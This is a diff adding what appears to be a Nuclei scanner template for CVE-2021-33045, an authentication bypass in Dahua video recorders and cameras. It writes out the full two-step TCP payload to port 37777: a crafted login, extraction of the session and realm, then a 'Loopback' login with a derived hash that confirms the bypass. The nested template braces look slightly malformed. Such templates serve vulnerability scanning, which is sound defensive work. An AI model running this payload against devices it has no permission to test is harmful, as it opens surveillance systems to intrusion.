@@ -1,0 +1,69 @@
+id: CVE-2021-33045
+info:
+  name: DaHua Login Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    NVR, XVR, VTO, and IPC are video products under the umbrella of Dahua. An authentication bypass vulnerability in Dahua products allows attackers to bypass authentication by sending crafted data packets.
+  reference:
+    - https://www.dahuasecurity.com/support/cybersecurity/details/957
+
+variables:
+  payload_start: "2000000044484950000000000000000091000000000000009100000000000000"
+  payload_end: '{"method": "global.login", "params": {"userName": "admin", "password": "", "clientType": "Web3.0", "loginType": "Direct"}, "id": 0, "session": 0}'
+
+tcp:
+  - inputs:
+      - data: "{{hex_decode(payload_start)}}{{payload_end}}"
+    host:
+      - "{{Hostname}}"
+    port: 37777
+    read-size: 8192
+    extractors:
+      - type: regex
+        name: session
+        internal: true
+        regex:
+          - "2273657373696f6e223a(.*?)7d"
+        group: 1
+      - type: regex
+        name: random
+        internal: true
+        regex:
+          - "72616e646f6d223a22(.*?)222c"
+        group: 1
+      - type: regex
+        name: realm
+        internal: true
+        regex:
+          - "227265616c6d223a22(.*?)227d2c"
+        group: 1
+    matchers:
+      - type: word
+        words:
+          - "code"
+        part: body
+
+  - inputs:
+      - data: |
+          {{
+            hex_decode(payload_start) +
+            "0100000009010000000000000901000000000000" +
+            '{"method": "global.login", "params": {"userName": "admin", "ipAddr": "127.0.0.1", "loginType": "Loopback", "clientType": "Local", "authorityType": "Default", "passwordType": "Default", "password": "' +
+            {{to_upper(md5('admin:' + extractor("realm") + ':admin'))}} +
+            '"}, "id": 1, "session": ' + extractor("session") + '}'}
+          }}
+    host:
+      - "{{Hostname}}"
+    port: 37777
+    read-size: 8192
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"result":true'
+        part: body
+      - type: word
+        words:
+          - '"session"'
+        part: body
